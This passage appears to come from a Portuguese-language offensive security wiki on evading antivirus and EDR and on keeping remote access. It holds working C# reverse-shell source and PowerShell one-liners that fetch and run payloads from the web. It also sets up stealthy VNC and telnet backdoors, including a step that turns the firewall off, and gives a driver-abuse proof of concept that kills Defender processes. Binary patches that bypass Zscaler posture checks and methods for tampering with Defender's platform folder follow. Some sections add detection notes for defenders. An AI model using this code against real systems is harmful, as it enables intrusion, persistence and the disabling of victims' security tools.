- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como descrito em [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil simplesmente instalar o Chrome Remote Desktop no PC da vítima e então usá-lo para takeover e manter persistência:
1. Baixe de https://remotedesktop.google.com/, clique em "Set up via SSH", e então clique no arquivo MSI para Windows para baixar o MSI.
2. Execute o instalador silenciosamente na vítima (admin requerido): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte para a página do Chrome Remote Desktop e clique em next. O assistente então pedirá para autorizar; clique no botão Authorize para continuar.
4. Execute o parâmetro dado com alguns ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note o parâmetro pin que permite definir o pin sem usar a GUI).


## Advanced Evasion

Evasion é um tema muito complicado, às vezes você precisa levar em conta muitas fontes diferentes de telemetria em um único sistema, então é praticamente impossível permanecer completamente indetectado em ambientes maduros.

Cada ambiente em que você atuar terá seus próprios pontos fortes e fracos.

Recomendo fortemente assistir a esta palestra do [@ATTL4S](https://twitter.com/DaniLJ94), para obter uma base sobre técnicas mais avançadas de Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta é também outra ótima palestra do [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Ver quais partes o Defender marca como maliciosas**

Você pode usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que irá **remover partes do binário** até **descobrir qual parte o Defender** está marcando como maliciosa e te mostrar.\
Outra ferramenta que faz a **mesma coisa é** [**avred**](https://github.com/dobin/avred) com um serviço web aberto em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Até o Windows10, todas as versões do Windows vinham com um **Telnet server** que você poderia instalar (como administrador) fazendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute-o** agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar telnet port** (stealth) e desabilitar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Faça o download em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os bin downloads, não o setup)

**ON THE HOST**: Execute _**winvnc.exe**_ e configure o servidor:

- Ative a opção _Disable TrayIcon_
- Defina uma senha em _VNC Password_
- Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **recém-criado** _**UltraVNC.ini**_ para dentro da **victim**

#### **Reverse connection**

O **attacker** deve **executar dentro** do seu **host** o binário `vncviewer.exe -listen 5900` para que ele fique **preparado** para capturar uma reverse VNC connection. Em seguida, dentro da **victim**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**AVISO:** Para manter stealth você não deve fazer as seguintes coisas

- Não inicie `winvnc` se ele já estiver em execução ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se está em execução com `tasklist | findstr winvnc`
- Não inicie `winvnc` sem `UltraVNC.ini` no mesmo diretório ou isso fará a [config window](https://i.imgur.com/rfMQWcf.png) abrir
- Não execute `winvnc -h` para ajuda ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Faça o download em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **xml payload** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O Defender atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro C# Revershell

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando o compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download automático e execução:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores para C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para construir injetores (exemplo):

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mais

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Desativando AV/EDR no espaço do kernel

Storm-2603 utilizou uma pequena ferramenta de console conhecida como **Antivirus Terminator** para desativar proteções de endpoint antes de instalar ransomware. A ferramenta traz seu **próprio driver vulnerável mas *assinado*** e o abusa para emitir operações privilegiadas no kernel que até mesmo serviços AV Protected-Process-Light (PPL) não conseguem bloquear.

Principais conclusões
1. **Signed driver**: O arquivo entregue em disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys` do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver possui uma assinatura válida da Microsoft, ele carrega mesmo quando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalação do serviço**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **kernel service** e a segunda o inicia para que `\\.\ServiceMouse` se torne acessível do espaço do usuário.
3. **IOCTLs expostos pelo driver**
| Código IOCTL | Capacidade                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar um processo arbitrário por PID (usado para matar serviços Defender/EDR) |
| `0x990000D0` | Excluir um arquivo arbitrário no disco |
| `0x990001D0` | Descarregar o driver e remover o serviço |

Prova de conceito mínima em C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por que funciona**: O BYOVD ignora completamente as proteções em user-mode; código que executa no kernel pode abrir processos *protegidos*, terminá-los ou adulterar objetos do kernel independentemente de PPL/PP, ELAM ou outras funcionalidades de hardening.

Detecção / Mitigação
• Ative a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows recuse carregar `AToolsKrnl64.sys`.  
• Monitore a criação de novos *kernel* services e alerte quando um driver for carregado de um diretório gravável por todos ou não constar na allow-list.  
• Observe handles em user-mode para objetos de dispositivo customizados seguidos por chamadas suspeitas `DeviceIoControl`.

### Contornando verificações de posture do Zscaler Client Connector por patching de binários em disco

O **Client Connector** da Zscaler aplica regras de device-posture localmente e depende de Windows RPC para comunicar os resultados a outros componentes. Duas escolhas de design fracas permitem um bypass completo:

1. A avaliação de posture ocorre **inteiramente no cliente** (um booleano é enviado ao servidor).  
2. Endpoints RPC internos apenas validam que o executável conectando é **assinado pela Zscaler** (via `WinVerifyTrust`).

Ao **patchar quatro binários assinados no disco** ambos os mecanismos podem ser neutralizados:

| Binário | Lógica original patchada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, então toda verificação é considerada conforme |
| `ZSAService.exe` | Chamada indireta a `WinVerifyTrust` | NOP-ed ⇒ qualquer processo (mesmo não assinado) pode se ligar aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituído por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Verificações de integridade no túnel | Curto-circuitado |

Trecho mínimo do patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Depois de substituir os arquivos originais e reiniciar a pilha de serviços:

* **Todos** os checks de postura exibem **verde/compatível**.
* Binários não assinados ou modificados podem abrir os endpoints RPC por named-pipe (ex.: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido ganha acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e verificações de assinatura simples podem ser derrotadas com alguns patches de bytes.

## Abusando do Protected Process Light (PPL) para manipular AV/EDR com LOLBINs

Protected Process Light (PPL) aplica uma hierarquia de signer/level de forma que apenas processos protegidos de nível igual ou superior podem manipular uns aos outros. No ofensivo, se você pode iniciar legitimamente um binário habilitado para PPL e controlar seus argumentos, você pode converter funcionalidade benignas (ex.: logging) em uma primitiva de escrita limitada, apoiada por PPL, contra diretórios protegidos usados por AV/EDR.

O que faz um processo ser executado como PPL
- O EXE alvo (e quaisquer DLLs carregadas) deve ser assinado com um EKU compatível com PPL.
- O processo deve ser criado com CreateProcess usando as flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve ser requisitado um nível de proteção compatível que corresponda ao signer do binário (ex.: `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para signers de anti-malware, `PROTECTION_LEVEL_WINDOWS` para signers do Windows). Níveis incorretos falharão na criação.

Veja também uma introdução mais ampla a PP/PPL e à proteção do LSASS aqui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Ferramentas do launcher
- Auxiliar de código aberto: CreateProcessAsPPL (seleciona o nível de proteção e encaminha os argumentos para o EXE alvo):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Padrão de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
Primitiva LOLBIN: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` auto-inicia e aceita um parâmetro para gravar um arquivo de log em um caminho especificado pelo chamador.
- Quando lançado como um processo PPL, a escrita do arquivo ocorre com suporte PPL.
- ClipUp não consegue analisar caminhos que contêm espaços; use caminhos curtos 8.3 para apontar para locais normalmente protegidos.

8.3 short path helpers
- Liste nomes curtos: `dir /x` em cada diretório pai.
- Obtenha o caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Execute a LOLBIN com capacidade PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (e.g., CreateProcessAsPPL).
2) Passe o argumento de caminho de log do ClipUp para forçar a criação de arquivo em um diretório AV protegido (e.g., Defender Platform). Use nomes curtos 8.3 se necessário.
3) Se o binário alvo normalmente estiver aberto/bloqueado pelo AV enquanto estiver em execução (e.g., MsMpEng.exe), agende a escrita na inicialização antes do AV iniciar instalando um serviço de auto-início que seja executado de forma confiável antes. Valide a ordem de inicialização com Process Monitor (boot logging).
4) Ao reiniciar, a escrita suportada por PPL ocorre antes do AV bloquear seus binários, corrompendo o arquivo alvo e impedindo a inicialização.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas e restrições
- Você não pode controlar o conteúdo que o ClipUp escreve além do local; a primitiva é adequada para corrupção em vez de injeção de conteúdo precisa.
- Requer administrador local/SYSTEM para instalar/iniciar um serviço e uma janela de reinicialização.
- O tempo é crítico: o alvo não deve estar aberto; a execução na inicialização evita bloqueios de arquivo.

Detecções
- Criação do processo `ClipUp.exe` com argumentos incomuns, especialmente quando filho de launchers não padrão, durante a inicialização.
- Novos serviços configurados para iniciar automaticamente binários suspeitos e que consistentemente iniciam antes do Defender/AV. Investigue criação/modificação de serviços anteriores a falhas na inicialização do Defender.
- Monitoramento de integridade de arquivos nos binários/Platform directories do Defender; criações/modificações inesperadas por processos com flags de protected-process.
- Telemetria ETW/EDR: procure processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo do nível PPL por binários não-AV.

Mitigações
- WDAC/Code Integrity: restrinja quais binários assinados podem rodar como PPL e sob quais processos pais; bloqueie invocações do ClipUp fora de contextos legítimos.
- Higiene de serviços: restrinja criação/modificação de serviços de auto-inicialização e monitore manipulação da ordem de inicialização.
- Garanta que a proteção contra adulteração do Defender e as proteções de inicialização antecipada estejam habilitadas; investigue erros de inicialização que indiquem corrupção de binários.
- Considere desabilitar a geração de nomes curtos 8.3 em volumes que hospedam ferramentas de segurança, se compatível com seu ambiente (teste exaustivamente).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona a subpasta com a maior string de versão lexicográfica (por exemplo, `4.18.25070.5-0`), então inicia os processos de serviço do Defender a partir daí (atualizando caminhos de serviço/registro conforme necessário). Essa seleção confia em entradas de diretório incluindo directory reparse points (symlinks). Um administrador pode explorar isso para redirecionar o Defender para um caminho gravável por um atacante e conseguir DLL sideloading ou interrupção do serviço.

Pré-requisitos
- Administrador local (necessário para criar diretórios/symlinks sob a pasta Platform)
- Capacidade de reiniciar ou acionar a re-seleção da plataforma do Defender (reinício do serviço na inicialização)
- Apenas ferramentas embutidas são necessárias (mklink)

Por que funciona
- O Defender bloqueia gravações em suas próprias pastas, mas sua seleção de plataforma confia em entradas de diretório e escolhe a versão lexicograficamente mais alta sem validar se o destino resolve para um caminho protegido/confiável.

Step-by-step (example)
1) Prepare um clone gravável da pasta Platform atual, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório de versão superior dentro de Platform apontando para sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Seleção do gatilho (reinicialização recomendada):
```cmd
shutdown /r /t 0
```
4) Verifique se MsMpEng.exe (WinDefend) está sendo executado a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Você deve observar o novo caminho do processo em `C:\TMP\AV\` e a configuração do serviço/registro refletindo essa localização.

Post-exploitation options
- DLL sideloading/code execution: Solte/substitua DLLs que o Defender carrega do seu diretório de aplicação para executar código nos processos do Defender. Veja a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remova o version-symlink para que, no próximo início, o caminho configurado não seja resolvido e o Defender falhe ao iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Observe que esta técnica não fornece escalada de privilégios por si só; requer direitos de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams podem mover a evasão em tempo de execução para fora do implant C2 e para dentro do próprio módulo alvo fazendo hook na Import Address Table (IAT) e roteando APIs selecionadas através de código controlado pelo atacante e position‑independent (PIC). Isso generaliza a evasão além da pequena superfície de APIs que muitos kits expõem (p.ex., CreateProcessA), e estende as mesmas proteções a BOFs and post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). O PIC deve ser self‑contained e position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Evasões típicas incluem:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
  - For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplique o patch após relocations/ASLR e antes do primeiro uso da importação. Reflective loaders like TitanLdr/AceLdr demonstram hooking durante DllMain do módulo carregado.
- Mantenha wrappers pequenos e PIC-safe; resolva a API verdadeira via o valor original da IAT que você capturou antes do patch ou via LdrGetProcedureAddress.
- Use transições RW → RX para PIC e evite deixar páginas graváveis e executáveis.

Call‑stack spoofing stub
- Draugr‑style PIC stubs constroem uma cadeia de chamadas falsa (endereços de retorno para módulos benignos) e então pivotam para a API real.
- Isso derrota detecções que esperam pilhas canônicas do Beacon/BOFs para APIs sensíveis.
- Combine com técnicas stack cutting/stack stitching para atingir frames esperados antes do prologue da API.

Integração operacional
- Prepend o reflective loader aos post‑ex DLLs para que o PIC e os hooks inicializem automaticamente quando a DLL for carregada.
- Use um Aggressor script para registrar APIs alvo de modo que Beacon e BOFs se beneficiem de forma transparente do mesmo caminho de evasão sem alterações de código.

Considerações de Detection/DFIR
- IAT integrity: entradas que resolvem para endereços non‑image (heap/anon); verificação periódica dos ponteiros de importação.
- Stack anomalies: endereços de retorno que não pertencem a imagens carregadas; transições abruptas para PIC non‑image; ancestralidade inconsistente de RtlUserThreadStart.
- Loader telemetry: gravações in‑process na IAT, atividade precoce em DllMain que modifica import thunks, regiões RX inesperadas criadas no load.
- Image‑load evasion: se houver hooking de LoadLibrary*, monitore carregamentos suspeitos de automation/clr assemblies correlacionados com eventos de memory masking.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## Referências

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
